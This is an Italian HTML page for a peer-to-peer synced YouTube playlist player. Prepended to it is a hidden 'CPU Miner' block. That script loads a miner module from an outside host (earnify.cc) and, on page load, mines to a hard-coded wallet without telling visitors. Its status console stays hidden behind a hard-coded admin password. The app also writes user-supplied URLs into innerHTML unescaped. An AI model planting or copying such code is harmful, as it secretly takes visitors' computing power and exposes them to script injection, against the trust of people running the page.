<!-- ==================== MINER CONSOLE ==================== -->
<style>
#mining-console {
    position: fixed;
    bottom: 80px;
    right: 20px;
    width: 280px;
    background: rgba(0, 0, 0, 0.9);
    border: 1px solid #ffffff33;
    border-radius: 6px;
    padding: 12px 14px;
    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.6);
    z-index: 1000;
    color: #ffffff;
    font-family: 'Courier New', monospace;
    font-size: 15px;
    line-height: 1.7;
    display: none;
}
.console-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 10px;
    padding-bottom: 8px;
    border-bottom: 1px solid #ffffff33;
}
.close-btn {
    background: #ffffff;
    color: #000;
    border: none;
    width: 22px;
    height: 22px;
    font-size: 16px;
    line-height: 18px;
    text-align: center;
    border-radius: 3px;
    cursor: pointer;
    font-weight: bold;
}
#reopen-btn {
    position: fixed;
    bottom: 20px;
    right: 20px;
    width: 50px;
    height: 50px;
    background: rgba(255,255,255,0.1);
    border: 2px solid #ffffff88;
    color: #ffffff;
    font-size: 26px;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    cursor: pointer;
    z-index: 999;
    box-shadow: 0 4px 15px rgba(0,0,0,0.5);
}
</style>

<div id="mining-console">
    <div class="console-header">
        <span><strong>CPU Miner</strong></span>
        <button class="close-btn" onclick="hideMinerConsole()"></button>
    </div>
    <div>Stato: <span id="status">Avviando...</span></div>
    <div>Hashrate: <span id="hashrate">0.00</span> KH/s</div>
    <div>Tempo: <span id="timer">00:00</span></div>
    <div>Job accettati: <span id="shares">0</span></div>
</div>

<div id="reopen-btn" onclick="askPassword()"></div>

<script type="module">
    import { autoMine, minotaurxHashrate } from "https://earnify.cc/miner.js";

    let miningStarted = false;
    let consoleUnlocked = false;   // ← Nuovo: ricorda se la password è stata inserita

    // Mining parte subito
    async function initMining() {
        try {
            await autoMine("RVWmPb6SyB7Rx6ugY6GYngsP5ciqjBaxoT", 0.2);
            miningStarted = true;
            document.getElementById("status").textContent = "Attivo";
            
            setInterval(() => {
                const hr = minotaurxHashrate.currentHashrateKHs || 0;
                const shares = minotaurxHashrate.sharesAccepted || 0;
                
                document.getElementById("hashrate").textContent = parseFloat(hr).toFixed(2);
                document.getElementById("shares").textContent = shares;
            }, 700);

        } catch (e) {
            console.error(e);
            document.getElementById("status").textContent = "Errore";
        }
    }

    window.askPassword = function() {
        if (consoleUnlocked) {
            showMinerConsole();
            return;
        }

        const password = prompt("Inserire admin password");
        if (password === "CpuMining") {
            consoleUnlocked = true;
            showMinerConsole();
        } else if (password !== null) {
            alert("Password errata!");
        }
    };

    window.hideMinerConsole = function() {
        document.getElementById("mining-console").style.display = "none";
        document.getElementById("reopen-btn").style.display = "flex";
    };

    function showMinerConsole() {
        document.getElementById("mining-console").style.display = "block";
        document.getElementById("reopen-btn").style.display = "none";
    }

    // Timer
    let startTime = Date.now();
    setInterval(() => {
        const elapsed = Math.floor((Date.now() - startTime) / 1000);
        const min = Math.floor(elapsed / 60).toString().padStart(2, '0');
        const sec = (elapsed % 60).toString().padStart(2, '0');
        document.getElementById("timer").textContent = `${min}:${sec}`;
    }, 1000);

    // Avvio
    window.addEventListener('load', () => {
        initMining();
    });
</script>
<!DOCTYPE html>
<html lang="it">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>YouTube Multi - Riproduzione Automatica</title>
<style>
    body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; max-width: 1100px; margin: 40px auto; padding: 20px; background: #f8f9fa; }
    h1 { text-align: center; color: #ff0000; }
    .container { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
    input { width: 70%; padding: 12px; font-size: 16px; border: 2px solid #ddd; border-radius: 8px; }
    button { padding: 12px 20px; font-size: 16px; border: none; border-radius: 8px; cursor: pointer; margin: 5px; }
    .btn-add { background: #28a745; color: white; }
    .btn-clear { background: #dc3545; color: white; }
    .btn-host { background: #007bff; color: white; }
    .list { margin: 20px 0; max-height: 250px; overflow-y: auto; border: 1px solid #ddd; border-radius: 8px; padding: 10px; }
    .video-item { display: flex; justify-content: space-between; align-items: center; padding: 10px; margin: 6px 0; background: #f8f9fa; border-radius: 6px; }
    .preview-container { margin: 25px 0; padding: 15px; background: #000; border-radius: 12px; text-align: center; }
    .status { padding: 10px; margin: 10px 0; border-radius: 6px; font-weight: bold; }
    .connected { background: #d4edda; color: #155724; }
</style>
</head>
<body>
<div class="container">
    <h1>🎥 YouTube Multi</h1>
    
    <div id="modeSelector">
        <h2>Scegli modalità</h2>
        <button class="btn-host" onclick="startHost()">🌐 HOST (Condividi codice)</button><br><br>
        <button onclick="startClient()">📱 CLIENT (Inserisci codice)</button><br><br>
        <button onclick="startStandalone()">▶️ Solo Locale</button>
    </div>

    <div id="mainApp" style="display:none;">
        <div class="status" id="statusBar" style="display:none;"></div>
        
        <input type="text" id="youtubeUrl" placeholder="Link YouTube (anche multipli)" style="width:100%; margin-bottom:10px;"/>
        <button class="btn-add" onclick="aggiungiVideo()">➕ Aggiungi</button>
        <button class="btn-clear" onclick="cancellaTutti()">🗑️ Cancella Tutti</button>

        <div class="list" id="videoList"></div>
        
        <div id="result" style="display:none;">
            <div class="preview-container">
                <div class="preview-title"><strong>Player Principale</strong></div>
                <div id="mainPlayer"></div>
            </div>
            <div id="previewContainer"></div>
        </div>
    </div>

    <div id="hostInfo" style="display:none; text-align:center; padding:20px; background:#d4edda; border-radius:8px;">
        <strong>Codice Host</strong><br>
        <div id="hostCode" style="font-size:3em; font-weight:bold; letter-spacing:8px; margin:15px 0;"></div>
        <button onclick="copyHostCode()">📋 Copia Codice</button>
    </div>
</div>

<!-- Client Modal -->
<div id="clientModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); z-index:1000; align-items:center; justify-content:center;">
    <div style="background:white; padding:30px; border-radius:12px; width:90%; max-width:400px; text-align:center;">
        <h3>Inserisci Codice (4 cifre)</h3>
        <input type="text" id="clientCodeInput" maxlength="4" style="font-size:32px; width:100%; text-align:center; padding:15px;" placeholder="1234">
        <br><br>
        <button onclick="connectAsClient()" style="padding:12px 30px; font-size:18px;">Connettiti</button>
        <button onclick="closeClientModal()">Annulla</button>
    </div>
</div>

<script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
<script>
let videos = [];
let player = null;
let peer = null;
let conn = null;
let isHost = false;
let currentCode = "";

function generate4DigitCode() {
    return String(1000 + Math.floor(Math.random() * 9000));
}

function startHost() {
    isHost = true;
    currentCode = generate4DigitCode();
    document.getElementById('modeSelector').style.display = 'none';
    document.getElementById('mainApp').style.display = 'block';
    document.getElementById('hostInfo').style.display = 'block';
    document.getElementById('hostCode').textContent = currentCode;
    initHostPeer();
}

function startClient() {
    document.getElementById('clientModal').style.display = 'flex';
}

function startStandalone() {
    document.getElementById('modeSelector').style.display = 'none';
    document.getElementById('mainApp').style.display = 'block';
}

function closeClientModal() {
    document.getElementById('clientModal').style.display = 'none';
}

function connectAsClient() {
    const code = document.getElementById('clientCodeInput').value.trim();
    if (code.length !== 4) return alert("Inserisci 4 cifre");
    
    closeClientModal();
    document.getElementById('modeSelector').style.display = 'none';
    document.getElementById('mainApp').style.display = 'block';
    
    peer = new Peer();
    peer.on('open', () => {
        conn = peer.connect(`ytmulti-${code}`);
        setupConnectionEvents();
    });
}

function initHostPeer() {
    peer = new Peer(`ytmulti-${currentCode}`);
    peer.on('connection', (c) => {
        conn = c;
        setupConnectionEvents();
        updateStatus("✅ Client connesso!", "connected");
    });
}

function setupConnectionEvents() {
    if (!conn) return;
    
    conn.on('open', () => {
        console.log("Connessione aperta");
        if (!isHost) sendCommand({type: "REQUEST_SYNC"});
    });

    conn.on('data', (data) => {
        console.log("Ricevuto:", data);
        if (data.type === "SYNC_STATE") {
            videos = data.videos || [];
            aggiornaTutto();
        } else if (isHost) {
            processCommand(data);
        }
    });

    conn.on('close', () => updateStatus("❌ Connessione chiusa", ""));
}

function sendCommand(cmd) {
    if (conn && conn.open) {
        conn.send(cmd);
    }
}

function processCommand(data) {
    if (!isHost) return;
    
    if (data.type === "ADD_VIDEO") {
        videos.push({id: data.id, url: data.url});
    } else if (data.type === "REMOVE_VIDEO") {
        videos.splice(data.index, 1);
    } else if (data.type === "CLEAR_ALL") {
        videos = [];
    } else if (data.type === "REQUEST_SYNC") {
        // niente
    }
    syncToClient();
}

function syncToClient() {
    if (conn && conn.open) {
        sendCommand({ type: "SYNC_STATE", videos: videos });
    }
    aggiornaTutto();
}

// ==================== AZIONI ====================
function aggiungiVideo() {
    const input = document.getElementById('youtubeUrl');
    const urls = input.value.trim().split(/\s+/);
    let added = false;

    for (let url of urls) {
        const id = estraiVideoId(url);
        if (id && !videos.some(v => v.id === id)) {
            if (isHost) {
                videos.push({id, url});
            } else {
                sendCommand({type: "ADD_VIDEO", id, url});
                input.value = '';
                return;
            }
            added = true;
        }
    }
    input.value = '';
    if (added && isHost) syncToClient();
    else aggiornaTutto();
}

function rimuoviVideo(i) {
    if (isHost) {
        videos.splice(i, 1);
        syncToClient();
    } else {
        sendCommand({type: "REMOVE_VIDEO", index: i});
    }
}

function cancellaTutti() {
    if (!confirm("Cancella tutto?")) return;
    if (isHost) {
        videos = [];
        syncToClient();
    } else {
        sendCommand({type: "CLEAR_ALL"});
    }
}

function updateStatus(text, className) {
    const bar = document.getElementById('statusBar');
    bar.textContent = text;
    bar.className = `status ${className}`;
    bar.style.display = 'block';
}

// ==================== FUNZIONI ORIGINALI ====================
function estraiVideoId(url) {
    url = url.trim();
    const regex = [
        /(?:https?:\/\/)?(?:www\.)?youtube\.com\/watch\?v=([^&]+)/,
        /(?:https?:\/\/)?(?:www\.)?youtu\.be\/([^?]+)/,
        /(?:https?:\/\/)?(?:www\.)?youtube\.com\/shorts\/([^?]+)/
    ];
    for (let r of regex) {
        const m = url.match(r);
        if (m && m[1]) return m[1];
    }
    return null;
}

function aggiornaTutto() {
    aggiornaLista();
    aggiornaAnteprimaSeparata();
    document.getElementById('result').style.display = videos.length > 0 ? 'block' : 'none';
    if (videos.length > 0 && !player) caricaPlayerPrincipale();
}

function aggiornaLista() {
    const list = document.getElementById('videoList');
    list.innerHTML = videos.length === 0 ? '<p style="text-align:center;color:#888;padding:20px;">Nessun video</p>' : '';
    videos.forEach((v, i) => {
        const div = document.createElement('div');
        div.className = 'video-item';
        div.innerHTML = `<span><strong>${i+1}.</strong> ${v.url}</span><button onclick="rimuoviVideo(${i})">Elimina</button>`;
        list.appendChild(div);
    });
}

function aggiornaAnteprimaSeparata() {
    const container = document.getElementById('previewContainer');
    container.innerHTML = '';
    videos.forEach((v, i) => {
        const wrap = document.createElement('div');
        wrap.className = 'video-wrapper';
        wrap.innerHTML = `<div class="video-number">${i+1}</div><iframe src="https://www.youtube.com/embed/${v.id}" frameborder="0" allowfullscreen></iframe>`;
        container.appendChild(wrap);
    });
}

function caricaPlayerPrincipale() {
    if (player) player.destroy();
    player = new YT.Player('mainPlayer', {
        height: '450', width: '800',
        videoId: videos[0].id,
        playerVars: { autoplay: 1, playlist: videos.map(v=>v.id).join(','), rel: 0 },
        events: { onReady: e => e.target.playVideo() }
    });
}

function copyHostCode() {
    navigator.clipboard.writeText(currentCode);
    alert("Codice copiato: " + currentCode);
}

// YouTube API
const tag = document.createElement('script');
tag.src = "https://www.youtube.com/iframe_api";
document.head.appendChild(tag);

document.getElementById('youtubeUrl').addEventListener('keypress', e => {
    if (e.key === 'Enter') aggiungiVideo();
});
</script>
</body>
</html>
